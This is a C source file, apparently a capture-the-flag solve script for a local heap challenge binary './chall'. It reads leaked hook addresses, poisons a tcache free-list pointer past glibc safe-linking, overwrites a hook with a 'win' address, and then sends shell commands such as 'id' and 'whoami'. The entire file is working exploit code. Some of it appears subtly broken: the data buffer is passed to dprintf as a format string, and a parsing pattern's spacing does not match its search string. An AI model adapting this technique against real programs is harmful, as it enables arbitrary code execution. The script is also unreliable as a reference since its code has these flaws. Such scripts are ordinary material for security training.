#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <string.h>
#include <inttypes.h>

int in, out;
char buf[4096];

static void ru(const char* needle) {
  size_t n = 0;
  buf[0] = '\0';

  while (!strstr(buf, needle)) {
    read(out, &buf[n++], 1);
    buf[n] = '\0';
  }
}

static void menu(int choice){
  ru("> ");
  dprintf(in, "%d\n", choice);
}

static void alloc_note(int idx, const void *data) {
  menu(1);
  ru("idx: ");
  dprintf(in, "%d\n", idx);

  ru("size: ");
  dprintf(in, "0x40\n");

  ru("data: ");
  dprintf(in, data, 0x40);
}

static void free_note(int idx) {
  menu(2);
  ru("idx: ");
  dprintf(in, "%d\n", idx);
}

static void edit_note(int idx, const void *data) {
  menu(3);
  ru("idx: ");
  dprintf(in, "%d\n", idx);

  ru("data: ");
  write(in, data, 0x40);
}

static uintptr_t inspect_ptr(int idx) {
  uintptr_t ptr;

  menu(5);
  ru("idx: ");
  dprintf(in, "%d\n", idx);

  ru("qword[1]");
  sscanf(strstr(buf, "ptr     = "),
         "ptr       = %" SCNxPTR, &ptr);

  return ptr;
}

static void addresses(uintptr_t *target, uintptr_t *win) {
  menu(7);
  ru("note: ");

  sscanf(strstr(buf, "target_hook @ "),
         "target_hook @ %" SCNxPTR, target);
  sscanf(strstr(buf, "win_hook    @ "),
         "win_hook    @ %" SCNxPTR, win);
}

int main(){
  int stdin[2], stdout[2];

  pipe(stdin);
  pipe(stdout);

  if(!fork()){
    dup2(stdin[0], STDIN_FILENO);
    dup2(stdout[1], STDOUT_FILENO);
    dup2(stdout[1], STDERR_FILENO);

    close(stdin[0]);
    close(stdin[1]);
    close(stdout[0]);
    close(stdout[1]);

    execl("./chall", "./chall", NULL);
  }

  close(stdin[0]);
  close(stdout[1]);
  in = stdin[1];
  out = stdout[0];

  uintptr_t target_hook, win_hook, poisoned_next;
  uint64_t data[8] = {0};
  uint64_t overwrite[8] = {0};

  addresses(&target_hook, &win_hook);

  alloc_note(0, data);
  alloc_note(1, data);

  free_note(0);
  free_note(1);

  uintptr_t chunk1 = inspect_ptr(1);
  poisoned_next = target_hook ^ (chunk1 >> 12);

  data[0] = (uint64_t)poisoned_next;
  edit_note(1, data);

  alloc_note(2, data);
  overwrite[0] = (uint64_t)win_hook;
  alloc_note(3, overwrite);

  menu(6);
  ru("message: ");
  dprintf(in, "id\nwhoami\nexit\n8\n");

  int n;
  while ((n = read(out, buf, sizeof(buf))) > 0)
    write(STDIN_FILENO, buf, n);
}
